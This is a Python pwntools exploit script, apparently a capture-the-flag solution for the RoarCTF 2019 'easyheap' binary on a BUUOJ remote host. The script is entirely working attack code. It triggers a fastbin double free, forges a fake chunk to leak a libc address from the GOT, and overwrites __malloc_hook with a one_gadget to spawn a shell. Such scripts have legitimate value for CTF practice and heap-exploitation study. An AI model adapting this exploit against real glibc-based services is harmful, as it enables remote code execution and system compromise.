#coding:utf8
from pwn import *
context.log_level = 'debug' 
sh = process('./roarctf_2019_easyheap')
elf = ELF('./roarctf_2019_easyheap')
libc = ELF('./libc/libc-2.23.so')
sh = remote('node4.buuoj.cn',26176)
malloc_hook_s = libc.symbols['__malloc_hook']
realloc_s = libc.sym['realloc']
one_gadget_s = 0xf1147

read_got = elf.got['read']
fake_chunk_addr = 0x0000000000602060
fake_chunk = p64(0) + p64(0x71)
fake_chunk = fake_chunk.ljust(0x20,'\x00')
sh.sendafter('please input your username:',fake_chunk)
sh.sendafter('please input your info:','haivk\n')
 
def add(size,content,blind = False):
   if not blind:
      sh.recvuntil('>>')
   else:
      sleep(0.3)
   sh.sendline('1')
   if not blind:
      sh.recvuntil('input the size')
   else:
      sleep(0.3)
   sh.sendline(str(size))
   if not blind:
      sh.recvuntil('please input your content')
   else:
      sleep(0.3)
   sh.send(content)
 
def delete(blind = False):
   if not blind:
      sh.recvuntil('>>')
   else:
      sleep(0.3)
   sh.sendline('2')
 
def show():
   sh.sendlineafter('>>','3')
 
def calloc_A0(content,blind = False):
   if not blind:
      sh.recvuntil('>>')
   else:
      sleep(0.3)
   sh.sendline('666')
   if not blind:
      sh.recvuntil('build or free?')
   else:
      sleep(0.3)
   sh.sendline('1')
   if not blind:
      sh.recvuntil('please input your content')
   else:
      sleep(0.3)
   sh.send(content)
 
def calloc_del(blind = False):
   if not blind:
      sh.recvuntil('>>')
   else:
      sleep(0.3)
   sh.sendline('666')
   if not blind:
      sh.recvuntil('build or free?')
   else:
      sleep(0.3)
   sh.sendline('2')
 
calloc_A0('a'*0xA0)
add(0x60,'b'*0x60)
calloc_del()
add(0x60,'a'*0x60)
add(0x60,'a'*0x60)
#double free
delete()
calloc_del()
delete()
 
add(0x60,p64(fake_chunk_addr))
add(0x60,'a'*0x60)
add(0x60,'b'*0x60)
add(0x60,'c'*0x18 + p64(read_got) + p64(0xDEADBEEFDEADBEEF))
show()
sh.recv(1)
read_addr = u64(sh.recv(6).ljust(8,'\x00'))
libc_base = read_addr - libc.sym['read']
realloc_addr = libc_base + realloc_s
malloc_hook_addr = libc_base + malloc_hook_s
one_gadget_addr = libc_base + one_gadget_s
print 'libc_base=',hex(libc_base)
print 'malloc_hook_addr=',hex(malloc_hook_addr)
print 'one_gadget_addr=',hex(one_gadget_addr)
#第一次调用为0时，不会执行，减1后变成负数
calloc_A0('a',True)
#利用同样的方法来double free
calloc_A0('a'*0xA0,True)
add(0x60,'b'*0x60,True)
calloc_del(True)
add(0x60,'a'*0x60,True)
add(0x60,'a'*0x60,True)
#double free
delete(True)
calloc_del(True)
delete(True)
add(0x60,p64(malloc_hook_addr - 0x23),True)
add(0x60,'a'*0x60,True)
add(0x60,'b'*0x60,True)
add(0x60,'\x00'*0xB + p64(one_gadget_addr) + p64(realloc_addr + 0x14),True)
#getshell
sh.sendline('1')
sleep(0.3)
sh.sendline('1')
 
sh.interactive()